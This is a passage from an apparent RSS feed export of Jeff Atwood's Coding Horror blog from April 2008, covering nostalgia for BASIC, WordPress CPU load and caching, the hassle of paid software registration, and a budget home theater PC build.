Surprisingly, the manual isn't available anywhere online, so <a href="http://www.flickr.com/photos/25885309@N02/sets/72157604661612578/">I scanned it in myself</a>. Take a look. It's <em>hilarious</em>. There is a <a href="http://www.atariage.com/manual_html_page.html?SoftwareLabelID=15">transcribed HTML version of the manual</a>, but it's much less fun to read without the pictures and diagrams.
</p>
<p>
I booted up a copy of the <a href="http://www.atariage.com/2600/roms/BasicProgramming.zip">Basic Programming ROM</a> in the <a href="http://stella.sourceforge.net/">Stella Atari 2600 emulator</a>, then followed along with the manual and wrote a little BASIC program.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
You'll notice that all the other screenshots of Atari 2600 Basic Programming on the web are essentially blank. That's probably because <strong>I'm the only person crazy enough to actually try <em>programming</em> in this thing</strong>. It may look painful, but you have no idea until you've tried to work with this funky "IDE". It's hilariously bad. I could barely stop laughing while punching away at my virtual keypads. But I have to confess, after writing my first "program", I got that same visceral little thrill of bending the machine to my will that I've always gotten.
</p>
<p>
The package I got from eBay included a few hand-written programming notes that I assume are from the 1980s.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Isn't that what BASIC – even this horribly crippled, elephant man Atari 2600 version of BASIC – is all about? Discovering fundamental programming concepts?
</p>
<p>
Of course, if you were at all interested in computers, you wouldn't bother programming on a dinky Atari 2600. There were much better options for gaming <em>and</em> programming in the form of home computers. And for the longest time, <strong>every home computer you could buy had BASIC burned into the ROM.</strong> Whether it was the Apple //, Commodore 64, or the Atari 800, you'd boot up to be greeted by a BASIC prompt. It became the native language of the hobbyist programmer.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Even the IBM PC had <a href="http://en.wikipedia.org/wiki/BASICA">BASICA</a>, <a href="http://en.wikipedia.org/wiki/Microsoft_GW-BASIC_interpreter">GW-BASIC</a> and finally <a href="http://en.wikipedia.org/wiki/QBasic">QBasic</a>, which was phased out with Windows 2000.
</p>
<p>
It's true that if you wanted to do anything remotely cutting-edge with those old 8-bit Apple, Commodore and Atari home computers, you had to pretty much learn assembly language. I don't recall any compiled languages on the scene until the IBM PC and DOS era, primarily <a href="http://en.wikipedia.org/wiki/Turbo_Pascal">Turbo Pascal</a>. Compiled languages were esoteric and expensive until the great democratization of Turbo Pascal at its low, low price point of $49.99.*
</p>
<p>
Even if you lacked the programming skills to become the next <a href="http://en.wikipedia.org/wiki/David_Crane_(programmer)">David Crane</a> or <a href="http://en.wikipedia.org/wiki/Will_Wright_(game_designer)">Will Wright</a>, there were still a lot of interesting games and programs you could still write in good old BASIC. Certainly more than enough to figure out if you enjoyed programming, and if you had any talent. The <a href="http://www.codinghorror.com/blog/archives/000414.html">Creative Computing compilations</a> were like programming bibles to us.
</p>
<p>
<a href="http://www.atariarchives.org/basicgames/"><img alt="image placeholder" >
</p>
<p>
For a long, long time, <strong>if you were interested in computers at all, you programmed in BASIC.</strong> It was as unavoidable and inevitable as the air you breathed. Every time you booted up, there was that command prompt blinking away at you. Why <em>not </em> type in some BASIC commands and see what happens? And then the sense of wonder, of possibility, of being able to unlock the infinitely malleable universe inside your computer. Thus the careers of millions of programmers were launched.
</p>
<p>
BASIC didn't mutilate the mind, as Dijkstra claimed. If anything, BASIC opened the minds of millions of young programmers. It was perhaps the earliest test to determine whether you were <a href="http://www.codinghorror.com/blog/archives/000635.html">a programming sheep or a non-programming goat</a>. Not all will be good, of course, but some inevitably <a href="http://jamesshore.com/Articles/Quality-With-a-Name.html">will go on to be great</a>.
</p>
<p>
Whether we're still programming in it or not, <strong>the spirit of BASIC lives on in all of us.</strong>
</p>
<p>
* as an aside, you may notice that <a href="http://en.wikipedia.org/wiki/Anders_Hejlsberg">Anders Hejlsberg</a> was the primary author of Turbo Pascal and later Delphi; he's now a <a href="http://www.microsoft.com/presspass/exec/techfellow/Hejlsberg/default.mspx">Technical Fellow at Microsoft</a> and the chief designer of the C# language. That's a big reason why so many longtime geeks, such as myself, are so gung-ho about .NET.
</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-21T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/everything-i-needed-to-know-about-programming-i-learned-from-basic/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Behold WordPress, Destroyer of CPUs ]]></title>
<link>https://blog.codinghorror.com/behold-wordpress-destroyer-of-cpus/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Lately I've been delving into the <a href="http://wordpress.org/">WordPress</a> ecosystem, as it seems to be the most popular blogging platform around at the moment. I've set up two blogs with it so far. In the process, I've gotten quite comfortable with the setup, interface, and overall operation of WordPress.
</p>
<p>
</p>
<ol>
<li>
<a href="http://blog.stackoverflow.com/">blog.stackoverflow.com</a>
</li>
<li>
<a href="http://www.fakeplasticrock.com/">www.fakeplasticrock.com</a>
</li>
</ol>
<p>
I've been thoroughly impressed with the community around WordPress, and the software itself is remarkably polished. That's not to say that I haven't run into a few egregious bugs in the 2.5 release, but on the whole, the experience has been good bordering on pleasant.
</p>
<p>
Or at least it <i>was</i>, until I noticed how much CPU time the PHP FastCGI process was using for modest little old blog.stackoverflow.com.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
For context, this is running on a Windows Web Server 2008 virtual machine with a single core of a 2.13 GHz Xeon 3210 entirely dedicated to it.
</p>
<p>
This is an <i>incredibly</i> scary result; blog.stackoverflow.com is getting, at best, a <b>moderate trickle of incoming traffic</b>. It's barely linked anywhere! With that kind of CPU load level, this site would fall over instantaneously if it got remotely popular, or God forbid, anywhere <i>near</i> the front page of a social bookmarking website.
</p>
<p>
For a bare-bones blog which is doing approximately nothing, this is a completely unacceptable result. It's appalling.
</p>
<p>
As evidence of what a systemic problem this is, there's an entire cottage industry built around shoehorning better caching behavior into WordPress. Take your pick: <a href="http://mnm.uib.es/gallir/wp-cache-2/">WP-Cache</a>, <a href="http://ocaoimh.ie/wp-super-cache/">WP-Super-Cache</a>, or <a href="http://error.wordpress.com/2006/07/04/bad-behavior-2/">Bad Behavior</a>. The caching add-ins <a href="http://www.allaboutduncan.com/index.php/2008/wp-cache-on-iis-finally/">don't work very well under IIS</a> because they assume they're running on a *NIX platform, but they can be coerced into working.
</p>
<p>
Does it work? Does it ever. Here's what CPU usage looks like with basic WP-Cache type functionality enabled:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I'm not alone; just do a web search on <a href="http://www.google.com/search?q=wordpress+'cpu+usage'">WordPress CPU usage</a> or <a href="http://www.google.com/search?q=wordpress+'digg+effect'">WordPress Digg Effect</a> and you'll find page after page of horror stories, most (all?) of which are solved by the swift and judicious application of the WP-Cache plugins.
</p>
<p>
It's not like this a new issue. Personally, I think it's absolutely irresponsible that <b>WP-Cache like functionality isn't already built into WordPress.</b> I would not even consider deploying WordPress anywhere without it. And yet, according to a <a href="http://wp-community.org/2008/04/06/episode-39/">recent podcast</a>, Matt Mullenweg dismisses it out of hand and hand-wavingly alludes to vague TechCrunch server reconfigurations.
</p>
<p>
A default WordPress install will query the database twenty times every time you refresh the page, even if not <i>one single element</i> on that page has changed. Doesn't that strike you as a bad idea? Maybe even, dare I say it, <i>sloppy programming?</i>
</p>
<p>
I understand that users may have umpteen thousand <a href="http://wordpress.org/extend/plugins/">WordPress plugins</a> installed, all of which demand to change on every page load. Yes, the easiest path, the path of least resistance, is to mindlessly query the database every time you're building a page. But I <i>cannot</i> accept that a default, bare-bones WordPress install hasn't the first clue how to cache and avoid expensive, redundant trips to the database.
</p>
<p>
It's frustrating, because caching is a completely solved problem in other programming communities. For example, the .NET framework has had <a href="http://msdn2.microsoft.com/en-us/library/aa478965.aspx">page output caching</a> and <a href="http://msdn2.microsoft.com/en-us/library/h30h475z(VS.71).aspx">page fragment output caching</a> baked into ASP.NET for years.
</p>
<p>
I sure am glad I started this blog in <a href="http://www.movabletype.org/">Movable Type</a> way back in 2004. Their classic <a href="http://www.sixapart.com/blog/2005/05/how-to-speed-up-publishing-in.html">static rendering</a> blog engine approach may be derided today, but I shudder to think of the number of times the Coding Horror webserver would have been completely incapacitated over the years by the naive -- no, that's too tame -- brainlessly stupid dynamic rendering approach WordPress uses.
</p>
<p>
What I just don't understand is why, after all these years, and all these documented problems, WordPress hasn't <b>folded WP-Cache into the core</b>. If you're ever planning to have traffic of any size on a WordPress blog, consider yourselves warned.
</p>
<p>
<font color="red">Update</font>: Matt Mullenweg kindly responded to this post and offered <a href="http://www.codinghorror.com/blog/files/matt-mullenweg-wordpress-mysql-recommendations.txt">his recommended MySQL configuration optimizations</a>. I definitely agree that the Query Cache is extremely important to performance, and for some reason it defaulted to off (zero size) on my installation. You may also want to look into <a href="http://www.xaprb.com/blog/2006/07/02/innotop-mysql-innodb-monitor/">innotop</a> and <a href="http://hackmysql.com/mysqlreport">mysqlreport</a> to ensure that all your MySQL caches are functioning at appropriate levels. Also, thanks to a few commenters for letting me know that one of this year's Google Summer of Code projects is <a href="http://code.google.com/soc/2008/wordpress/appinfo.html?csaid=7E1A38664ABC103C">integrating caching into the core WordPress code</a>. It is badly needed.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-22T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/behold-wordpress-destroyer-of-cpus/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Problem with Software Registration ]]></title>
<link>https://blog.codinghorror.com/the-problem-with-software-registration/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As a person who has spent a significant part of his professional life getting paid to write software, I believe it's <b>important for me to regularly pay for software</b>, too. Our programmer salaries don't come from magical money trees. They come from customers laying down cold, hard cash for the software we've built. That's why every month I try to put into action what I described in <a href="http://www.codinghorror.com/blog/archives/000735.html">Support Your Favorite Small Software Vendor Day</a>:
</p>
<p>
</p>
<blockquote>
Check your hard drive, and I'm sure you, too, will find some bit of software written by a small software development shop, maybe even a single developer. Something you find incredibly useful. Something you rely on every day. Something you recommend without reservation to friends and peers. Something that makes using the computer that much more enjoyable. Or at least less painful.
<p>
<b>Stop reading this post right now and buy that software.</b> If it's not commercial software, don't let that stop you. Share the love by sending money to the person/shop/organization that created it.
</p>
</blockquote>
<p>
As I encounter apps that I find helpful and use regularly, I go out of my way to support them by either <a href="http://www.codinghorror.com/blog/archives/000993.html">donating</a>, or registering and buying a license. It's just plain good karma. There's nothing more effective than voting with your wallet. As I see it, if you don't vote, you aren't entitled to have an opinion.
</p>
<p>
But here's what I find deeply troubling: often, <b>registering software leaves me with a worse experience than not registering</b>. Allow me to illustrate with an example.
</p>
<p>
I've been transferring our podcast files back and forth to <a href="http://blog.stackoverflow.com/">blog.stackoverflow.com</a> via FTP, so I reinstalled <a href="http://www.smartftp.com/">SmartFTP</a>. Now, I've used SmartFTP quite a bit over the years, but never bothered to pay for it. They've done a great job of regularly improving and enhancing it every time I use it again. That's exactly the kind of useful, living software project I want to support.
</p>
<p>
Until I register, I'm presented with this little nag screen every time I start SmartFTP. It's mildly annoying, but tolerable -- and it prominently features a convenient "buy me" button. Hey! That's what I want to do!
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I click that button and get whisked away to a website where I'm now confronted with a choice: home or professional?
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Gee, I don't know. I'm conflicted. Now I have to think about what <i>features</i> I want, and how much I'm willing to pay for said features.
</p>
<p>
This is already starting to be kind of a drag.
</p>
<p>
I now feel like I'm being gamed. There's a name for this game, and unfortunately it's not something fun and cool like Grand Theft Auto IV -- this particular game is called <a href="http://www.joelonsoftware.com/articles/CamelsandRubberDuckies.html">capturing consumer surplus</a>.
</p>
<p>
</p>
<blockquote>
Let's do this. Instead of charging $220, let's ask each of our customers if they are rich or if they are poor. If they say they're rich, we'll charge them $349. If they say they're poor, we'll charge them $220.
<p>
Now how much do we make?
</p>
<p>
Notice the quantities: we're still selling the same 233 copies, but the richest 42 customers, who were all willing to spend $349 or more, are being asked to spend $349. And our profits just went up! from $43K to about $48K! NICE!
</p>
</blockquote>
<p>
Any resemblance between this and <a href="http://www.penny-arcade.com/comic/2007/02/02/">Windows Vista Kenny Loggins edition</a> is, I'm sure, purely coincidence. I finally decide I'm a "home" FTP user, whatever the heck that means. I suspect it's a sneaky marketing weasel synonym for "cheap bastard".
</p>
<p>
As a reward, now I get to play <i>another</i> game called <b>fill out the giant order form</b>. You've played this one before. Note that in this particular game, you can score bonus points for trying to route this form through your complex corporate payment system.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
After all that, I manage to pay. It's a sort of unavoidable flat tax on effort for any form of online commerce. Eventually, I receive this in my email inbox:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Now I have <i>three</i> choices. None of which make a whole lot of sense on my initial reading. It looks like there's some kind of key file I'm going to need? I'll try the middle link to download it. I don't really want another executable of unknown provenance on my system. After downloading the license file, I use the help menu to install it:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Et Voil! In only <i>sixteen fun and easy steps</i>, I have registered this software and voted with my wallet!
</p>
<p>
But that registration is only the beginning of my problems:
</p>
<p>
</p>
<ul>
<li>I now need to keep track of a license file.
</li>
<li>The license is probably tied to a particular computer, so if I reinstall the OS, or upgrade the hardware, that license might break.
</li>
<li>If I lose my license, I need to remember my login credentials on the vendor's website to retrieve them.
</li>
<li>My license is only valid for one year. When that year is up, I need to go through these motions and re-license the software yet again.
</li>
</ul>
<p>
Now-- and here's the kicker-- <b>multiply all this licensing pain by the number of applications and people in your organization.</b>
</p>
<p>
Even for a solo user like me, it's bad. I have apps I've registered and paid for that I somehow never got license keys for, such as WinRAR. I have apps that I simply don't use because I'm too lazy to re-register them on my new install, such as EditPad Pro. I've long since lost track of what versions of which apps I have valid registrations for. You can imagine the kind of fun that awaits me at the end of any new system build, a virtual jamboree of re-registrations.
</p>
<p>
Now let's compare that with the process of <b>"registering" the open source FTP tool FileZilla</b>:
</p>
<p>
</p>
<ol>
<li>
<a href="http://filezilla-project.org/download.php?type=client">Download FileZilla</a>
</li>
<li>
<a href="http://filezilla-project.org/donate.php">Donate</a> $36.95 to the project
</li>
</ol>
<p>
Oh, and step three? <i>There is no step three!</i> I never have to think about registration, licensing, or any of that other crap again. Ever!
</p>
<p>
There's no doubt that SmartFTP is the superior FTP client. I'm more than happy to register and reward them for their years of development work. But in the future, I think I'll be voting with my wallet for <b>the registration process that makes my life easier, not harder.</b>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-24T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-problem-with-software-registration/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Building Your Own Home Theater PC ]]></title>
<link>https://blog.codinghorror.com/building-your-own-home-theater-pc/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>I've kept a PC in my living room for the past three years as <a href="http://www.codinghorror.com/blog/archives/000784.html">my primary home theater interface</a>, and I heartily recommend
it. It's shocking <b>how cheap and easy it is to build a home theater PC these days</b>.</p>
<p>I've been pondering an upgrade to <a href="http://www.codinghorror.com/blog/archives/000221.html">my creaky old home
theater PC</a>, and rave reviews of the new integrated AMD platform at <a href="http://techreport.com/articles.x/14261/1">Tech Report</a>, <a href="http://www.silentpcreview.com/article807-page1.html">Silent PC Review</a>, and <a href="http://www.tomshardware.com/reviews/amd-780g-chipset,1785.html">Tom's Hardware</a> finally pushed me over the edge.</p>
<table cellpadding="4" cellspacing="4" width="500">
<tr>
<td>CPU</td>
<td>
<a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16819103255%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Processors%2B-%2BDesktops-_-AMD-_-19103255&amp;cjsku=N82E16819103255">
AMD Athlon X2 4850e 2.5 GHz</a> (45w)</td>
<td>$60</td>
</tr>
<tr>
<td>Mobo</td>
<td><a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16813128341%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Motherboards%2B-%2BAMD-_-GIGABYTE-_-13128341&amp;cjsku=N82E16813128341">
Gigabyte GA-MA78GPM-DS2H Micro ATX</a></td>
<td>$100</td>
</tr>
<tr>
<td>RAM</td>
<td><a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16820134635%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Memory%2B%28Desktop%2BMemory%29-_-Kingston%2BTechnology-_-20134635&amp;cjsku=N82E16820134635">
Kingston 2GB DDR2 800</a></td>
<td>$39</td>
</tr>
<tr>
<td>PSU</td>
<td><a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16817151058%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Power%2BSupplies-_-SeaSonic%2BUSA-_-17151058&amp;cjsku=N82E16817151058">
Seasonic ECO 300W</a></td>
<td>$55</td>
</tr>
<tr>
<td>DVD</td>
<td><a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16827106057%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-CD%2FDVD%2BBurners%2B%28RW%2BDrives%29-_-Lite-On-_-27106057&amp;cjsku=N82E16827106057">
Lite-On 20X DVDÃ‚Â±R SATA</a></td>
<td>$29</td>
</tr>
</table>
<p>I didn't buy the PSU because I already have that particular model, but I bought everything else on this list for a
grand total of <b>less than 250 bucks.</b> (You can save a bit on the power supply, but I don't recommend it, particularly if you plan to leave your HTPC
running 24/7. <a href="http://www.codinghorror.com/blog/archives/000871.html">Efficient power supplies</a> not only save you money on electricity in the long run, but also tend to be of generally higher quality, and quieter to boot.)</p>
<p>The new <a href="http://www.amd.com/us-en/0,,3715_15532,00.html?redir=780g1">AMD 780G</a> platform is striking in its simplicity. Just pop in the RAM and the low-power Athlon X2 CPU and you
have an (almost) complete ultra low-power home theater PC. Just check out the awesome array of rear panel connections:</p>
<p><img alt="image placeholder" >
<p>We have the expected stuff (4x USB, gigabit ethernet), but the exciting part is <b>DVI, VGA, and HDMI video out!</b>
Not to mention optical digital out for beautiful, pristine digital audio direct to your receiver. Those are the key
connections for a home theater PC. We even have an eSATA port and firewire thrown in, which is always nice.</p>
<p> I simply dropped the new motherboard and DVD in my existing transparent acrylic Micro-ATX PC case, replacing the old stuff. (If you're thinking of going this route, I can recommend the <a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16811129039%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Cases%2B%28Computer%2BCases%2B-%2BATX%2BForm%29-_-Antec-_-11129039&amp;cjsku=N82E16811129039">Antec Minuet Micro-ATX case</a> for $100, which conveniently comes with an efficient power supply, too -- but be aware of the half-height expansion slots.) </p>
<p><img alt="image placeholder" >
<p>I kept my existing hard drives (a small 2.5" boot drive for low noise / power consumption, and giant capacity 3.5"
drives for long-term storage and recording), and my <a href="http://www.dpbolvw.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16815116632%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Video%2BDevices%2B%2B%2BTV%2BTuners-_-Hauppauge-_-15116632&amp;cjsku=N82E16815116632">
Hauppauge PVR-150 dual analog PCI tuner card</a>, which I love to death.</p>
<p>For the longest time, <i>integrated</i> graphics was synonymous with <i>craptacular</i> graphics. That's not the case for this new AMD 780g chipset. The integrated graphics are fully DirectX 10 compliant, comparable to the latest entry-level discrete video
cards. Gaming isn't our goal, though this would be perfectly adequate for many games. More importantly for a HTPC
build, the integrated graphics support <a href="http://www.techreport.com/articles.x/14261/9">the full suite of H.264
and WMV video playback acceleration</a>.</p>
<p>
<img alt="image placeholder" >
<p>I know a WEI graphics score of 3.5 doesn't sound like much, but brother, let me tell you -- this is light years ahead of anything else on
the market at this power consumption point.</p>
<p><font color="red">Update:</font> I had a hardware failure of my own causing (don't ask) and I needed to replace this motherboard. Fortunately, there is a <a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16813128341%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Motherboards%2B-%2BAMD-_-GIGABYTE-_-13128341&amp;cjsku=N82E16813128341">new version of this motherboard</a> with 128 MB of dedicated "sideport" DDR3 graphics memory on board. With the addition of dedicated video memory <b>the WEI graphics score went from 3.5 / 3.6 to 4.0 / 4.0!</b></p>
<p>My old Pentium-M single core <a href="http://www.codinghorror.com/blog/archives/000746.html">struggled to
play back 1080p videos</a>. The Athlon X2 4050e CPU I chose is one of <a href="http://www.tomshardware.com/reviews/amd-power-cpu,1925.html">AMD's low power dual core models</a>, far from top of
the line. The testers at SilentPCReview found <b>any modern dual core chip</b> is <a href="http://www.silentpcreview.com/article807-page8.html">more than enough</a> for the most strenuous of video playback
tasks:</p>
<blockquote>Gradually underclocking the CPU, we found that the Blu Ray disc began to stutter at about 1.1Ghz, while
audio glitches were detected in the WVC1 clip at 1.4Ghz. 1.5Ghz was the lowest clock speed that would smoothly play
back all our clips. This was a fantastic result as the lowest clocked X2 on the market is 2.0 Ghz.</blockquote>
<p>AMD is a better choice for a home theater PC because their idle voltage and multiplier throttling -- the marketing
term is "Cool n' Quiet" -- is outstanding. (I'm also glad to have the opportunity to support AMD because I'm desperately afraid of a world where Intel is the only CPU vendor. And you should be too.) This variant of the Athlon 64 X2 chip is so new that
<a href="http://www.cpuid.com/cpuz.php">CPU-Z</a> doesn't quite recognize it by name. But as you can see, at idle, it clocks down to a miserly 1 GHz and reduces its power consumption to barely over one volt.</p>
<p><img alt="image placeholder" >
<p>My old highly optimized HTPC build consumed <font color="red">just under 80 watts at idle</font>, up from around 65
before I began upgrading it to make it more Vista friendly. Guess how much this new HTPC platform build, which is
<b>more than twice as powerful</b>, consumes at idle? Let's whip out <a href="http://www.codinghorror.com/blog/archives/001099.html">our handy dandy kill-a-watt</a> and find out:</p>
<p><img alt="image placeholder" >
<p><font color="red">FORTY. SIX. WATTS.</font></p>
<p>That is flippin' <i>amazing</i>. We're talking about a powerful modern PC here, with quite a bit of additional
hardware you wouldn't find in most PCs, including a <a href="http://www.dpbolvw.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16815116632%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Video%2BDevices%2B%2B%2BTV%2BTuners-_-Hauppauge-_-15116632&amp;cjsku=N82E16815116632">
dual TV tuner PCI card</a> and three hard drives. Granted two of those drives are in sleep mode most of the time, but
still. 46 watts -- twice the power at almost half the energy consumption! Incredible! Silence and efficiency were
nowhere <i>near</i> this easy three or four years ago.</p>
<p>Needless to say, I'm pretty excited about this particular $250 upgrade, and I can sell my old parts to underwrite
it.</p>
<p>On the software front, as I mentioned at the top, I've been a fan of Windows Media Center <a href="http://www.codinghorror.com/blog/archives/000100.html">since the first version</a>; it's one of the best products to
come out of Redmond in years, and <a href="http://www.codinghorror.com/blog/archives/000784.html">the version of Media
Center bundled with Vista</a> (well, Ultimate and Home Premium, anyway) is the best yet. With a hardware setup this
compelling, I'm sure you'll have no problem at all mating it with your favorite HTPC software.</p>
<p>If you do end up running Windows and connecting your HTPC to a DVI or HDMI capable television, beware. Getting
an exact, pixel-for-pixel connection between your HTPC and your TV isn't easy. For example, I had trouble getting the
ATI Catalyst graphics driver to accept <b>852x480, the standard resolution of our old plasma EDTV</b>. Sure 800x600
worked fine, but the aspect ratio was totally off. That's where <a href="http://www.entechtaiwan.com/util/ps.shtm">PowerStrip</a> comes in.</p>
<p><img alt="image placeholder" >
<p>PowerStrip will let you achieve that ideal pixel-for-pixel perfect connection between your graphics card and your
television. I selected the built in EDTV preset as a custom resolution, and all was well. PowerStrip is <i>the</i> go-to
utility for tweaking home theater display output.</p>
<p><b>We use our home theater PC every day.</b> It's silent, draws very little power, and it's small enough to tuck away cleanly in
our living room decor. It plays <i>anything</i> through a slick 10-foot UI, and offers unrestricted access to the web
at any time. Putting a great one together today is almost ridiculously easy. If you haven't considered building your own home theater PC -- why not?</p>
<p>
<font color="red">UPDATE</font>: since people asked, here's a complete from-scratch build list for a home theater PC.
</p>
<table cellpadding="4" cellspacing="4" width="500">
<tr>
<td>CPU</td>
<td>
<a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16819103255%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Processors%2B-%2BDesktops-_-AMD-_-19103255&amp;cjsku=N82E16819103255">
AMD Athlon X2 4850e 2.5 GHz</a> (45w)</td>
<td>$70</td>
</tr>
<tr>
<td>Mobo</td>
<td><a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16813128341%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Motherboards%2B-%2BAMD-_-GIGABYTE-_-13128341&amp;cjsku=N82E16813128341">
Gigabyte GA-MA78GPM-DS2H Micro ATX</a></td>
<td>$100</td>
</tr>
<tr>
<td>RAM</td>
<td><a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16820134635%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Memory%2B%28Desktop%2BMemory%29-_-Kingston%2BTechnology-_-20134635&amp;cjsku=N82E16820134635">
Kingston 2GB DDR2 800</a></td>
<td>$40</td>
</tr>
<tr>
<td>DVD</td>
<td><a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16827106057%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-CD%2FDVD%2BBurners%2B%28RW%2BDrives%29-_-Lite-On-_-27106057&amp;cjsku=N82E16827106057">
Lite-On 20X DVDÃ‚Â±R SATA</a></td>
<td>$30</td>
</tr>
<tr>
<td>Case/PSU</td>
<td>
<a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16811129039%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Cases%2B%28Computer%2BCases%2B-%2BATX%2BForm%29-_-Antec-_-11129039&amp;cjsku=N82E16811129039">Antec Minuet</a> w/80plus certified PSU</td>
<td>$100</td>
</tr>
<tr>
<td>HDD</td>
<td>
<a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16822136149%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Hard%2BDrives-_-Western%2BDigital-_-22136149&amp;cjsku=N82E16822136149">Western Digital quiet 500 GB</a>
</td>
<td>
$90
</td>
</tr>
<tr>
<td>
Tuner
</td>
<td>
<a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16815116629%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Video%2BDevices%2B%2B%2BTV%2BTuners-_-Hauppauge-_-15116629&amp;cjsku=N82E16815116629">Hauppauge low profile analog cable/TV</a>
</td>
<td>
$76
</td>
</tr>
<tr>
<td>
Remote
</td>
<td>
<a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16880121001%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Digital%2BMedia%2BRemote-_-Anyware-_-80121001&amp;cjsku=N82E16880121001">Standard Media Center IR</a>
</td>
<td>
$17
</td>
</tr>
<tr>
<td></td>
<td></td>
<td><b>$523</b></td>
</tr>
</table>
<p>If you plan to use Vista Media Center, add a <a href="http://www.dpbolvw.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16832116485%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Software%2B-%2BOperating%2BSystems-_-Microsoft-_-32116485&amp;cjsku=N82E16832116485">Vista Home Premium SP1 license for $110</a>. I also saw that Blu-Ray internal drives (read only) are down to $130 as of the time I'm writing this.</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-25T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/building-your-own-home-theater-pc/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Programmers Don't Read Books -- But You Should ]]></title>
<link>https://blog.codinghorror.com/programmers-dont-read-books-but-you-should/</link>
<content><![CDATA[ 
